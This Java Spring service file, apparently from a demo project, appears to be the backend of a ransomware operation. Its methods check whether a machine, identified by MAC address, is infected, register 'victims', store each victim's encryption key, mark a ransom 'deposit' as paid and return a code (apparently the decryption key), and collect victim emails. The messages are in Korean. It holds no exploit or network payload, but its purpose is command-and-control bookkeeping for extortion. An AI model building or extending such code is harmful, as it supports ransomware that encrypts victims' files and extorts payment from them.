package com.example.demo.Service;

import com.example.demo.Dao.VictimDao;
import com.example.demo.Exceptions.EncrptsFailedException;
import com.example.demo.Exceptions.injectionFailedException;
import com.example.demo.utils.ObjectMaker;
import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Service;

import java.util.List;

@Component
@RequiredArgsConstructor
@Service
public class VictimsService {

    private final VictimDao victimDao;

    public org.json.simple.JSONObject findUserByMac(String address) {
        org.json.simple.JSONObject jsonObject = ObjectMaker.getSimpleJSONObject();
        Boolean result = victimDao.findVictims(address);
        jsonObject.put("result", true);
        jsonObject.put("message", "감염여부 확인 성공");
        jsonObject.put("damaged", result);
        return jsonObject;
    }
    public org.json.simple.JSONObject infectionUser(String address) {
        org.json.simple.JSONObject jsonObject = ObjectMaker.getSimpleJSONObject();
        try{
            victimDao.userInfection(address);
            jsonObject.put("result", true);
            jsonObject.put("message", "감염자 정보 등록 성공");
        }catch (injectionFailedException e) {
            jsonObject = ObjectMaker.getJSONObjectWithException(e);
        }
        return jsonObject;
    }
    public org.json.simple.JSONObject encrpts(String address,String key) {
        org.json.simple.JSONObject jsonObject = ObjectMaker.getSimpleJSONObject();
        try{
            victimDao.encrpts(key,address);
            jsonObject.put("result", true);
            jsonObject.put("message", "감염자 키 등록 성공");
        }catch (EncrptsFailedException e) {
            jsonObject = ObjectMaker.getJSONObjectWithException(e);
        }
        return jsonObject;
    }
    public org.json.simple.JSONObject deposit(String address) {
        org.json.simple.JSONObject jsonObject = ObjectMaker.getSimpleJSONObject();
        String result = victimDao.deposit(address);
        jsonObject.put("result", true);
        jsonObject.put("message", "입금완료");
        jsonObject.put("code", result);
        return jsonObject;
    }
    public org.json.simple.JSONObject email(String address,String email)  {
        org.json.simple.JSONObject jsonObject = ObjectMaker.getSimpleJSONObject();
        try {
            victimDao.email(address, email);
            jsonObject.put("result", true);
            jsonObject.put("message", "이메일 등록완료");
        }catch (EncrptsFailedException e){ jsonObject = ObjectMaker.getJSONObjectWithException(e);}
        return jsonObject;
    }
    public List<String> sendEmail()  {
        List<String> list = victimDao.sendEmail();
        return list;
    }
}
